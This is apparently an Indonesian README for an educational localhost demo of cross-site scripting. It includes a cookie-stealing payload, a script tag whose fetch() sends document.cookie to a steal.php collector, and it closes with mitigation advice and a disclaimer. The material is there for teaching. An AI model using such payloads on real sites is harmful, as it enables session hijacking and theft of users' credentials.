# 🚨 XSS Attack Demo - Localhost Setup

Selamat datang di repo ini gengss! 👋  
Di sini kita bakal ngebahas gimana sih serangan **Cross-Site Scripting (XSS)** itu bisa terjadi, gimana caranya dijalankan, serta dampaknya ke aplikasi web 💻. Semuanya kita coba langsung di localhost pake XAMPP biar aman dan nggak nyerang siapa-siapa 😎.

## 🎯 Tujuan
- Memahami dasar serangan XSS
- Mengetahui bagaimana XSS dapat mencuri cookie
- Menjelaskan mitigasi sederhana terhadap XSS

---

## 🗂️ Struktur Folder

demo-xss/
├── index.html # Halaman form login
├── xss-demo.html # Halaman yang vulnerable XSS
├── steal.php # File untuk menerima dan mencatat cookie
├── cookies.txt # File tempat cookie korban disimpan

yaml
Salin
Edit

---

## 🛠️ Setup Lokal

1. Install [XAMPP](https://www.apachefriends.org/index.html)
2. Letakkan semua file di folder: `htdocs/demo-xss/`
3. Jalankan Apache dari XAMPP Control Panel
4. Akses di browser:
http://localhost/demo-xss/index.html

yaml
Salin
Edit

---

## 💥 Cara Menjalankan Demo XSS

### 1. Buka `index.html`
Masukkan username: `admin123`  
(ini akan set cookie `username=admin123`)

```html
<script>
document.cookie = "username=admin123; path=/";
</script>
2. Buka xss-demo.html
Masukkan payload ini di kolom komentar:

html
Salin
Edit
<script>
  fetch('http://localhost/xss-demo/steal.php?cookie=' + encodeURIComponent(document.cookie))
</script>
3. Cek file cookies.txt
Buka cookies.txt di folder project. Di sana akan muncul cookie korban seperti:

ini
Salin
Edit
username=admin123
🔐 Penjelasan Singkat
Script jahat dijalankan dari input user yang tidak difilter

document.cookie mengambil cookie aktif

fetch() mengirim data ke steal.php

steal.php menyimpan data ke cookies.txt

🛡️ Cara Mencegah XSS
✅ Escape & sanitasi input user
✅ Gunakan Content Security Policy (CSP)
✅ Hindari penggunaan innerHTML dan document.write()
✅ Validasi input di sisi server dan client

📚 Referensi
OWASP XSS Guide

MDN Web Docs

PortSwigger XSS Academy

⚠️ Disclaimer
🛑 Tujuan dari repo ini hanya untuk edukasi.
Jangan pernah melakukan serangan XSS ke website orang lain tanpa izin! 😡
Use it responsibly and ethically 🙏

📩 Kontak
Kalau ada pertanyaan atau pengen bahas lebih lanjut, feel free buat open issue atau DM ya!
